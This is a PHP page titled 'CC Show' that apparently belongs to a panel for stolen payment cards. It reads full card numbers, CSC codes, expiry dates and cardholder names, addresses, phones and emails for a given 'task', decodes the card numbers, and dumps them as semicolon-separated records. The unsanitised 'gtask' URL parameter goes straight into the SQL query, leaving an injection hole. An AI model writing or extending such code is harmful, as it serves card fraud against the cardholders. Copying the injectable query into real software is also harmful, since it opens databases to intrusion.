<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/tr/html4/loose.dtd">

<?php
$gtask = $_GET['gtask'];
if ( !isset($gtask) )
	exit;
?>

<?php

$content .= "<h2>Cards for task #$gtask</h2>";

$content .= "<textarea cols='100' rows='30' wrap='off'>"

?>

<?php

require_once 'mod_dbase.php';
require_once 'mod_crypt.php';
require_once 'mod_file.php';

$dbase = db_open();
if (!$dbase) exit;

$sql = ' SELECT cards.num, cards.csc, cards.exp_date, cards.name, cards.surname, cards.address, cards.city, cards.state, cards.post_code, country_t.name_country, cards.phone_num, email_t.value_email '
	 . ' FROM cards, country_t, email_t'
	 . ' WHERE cards.fk_email = email_t.id_email'
	 . '   AND cards.fk_country = country_t.id_country'
	 . "   AND cards.fk_gtask = $gtask";
$res = mysqli_query ($dbase, $sql);
if ((!(@($res))) || !mysqli_num_rows($res)) {
	writelog("error.log", "Wrong query : \" $sql \"");
	free_sem($sem_id);
	db_close($dbase);
	exit;
}

while ( list($num_card, $csc, $exp_date, $name, $surname, $address, $city, $state, $post_code, $country, $phone_num, $email) = mysqli_fetch_row($res) ) { 
	
	list($year, $month) = split('[\/.-]', $exp_date);
	$exp_date = gmdate("m/y", mktime(0, 0, 0, $month, 1, $year));
	
	$num_card = encode(base64_decode($num_card), $csc);
	
	$content .= "$num_card;$csc;$exp_date;$name;$surname;$address;$city;$state;$post_code;$country;$phone_num;$email\n";

}

$content .= "</textarea>";

?>

<?php
require_once 'frm_skelet.php';
echo get_smskelet('CC Show', $content);
?>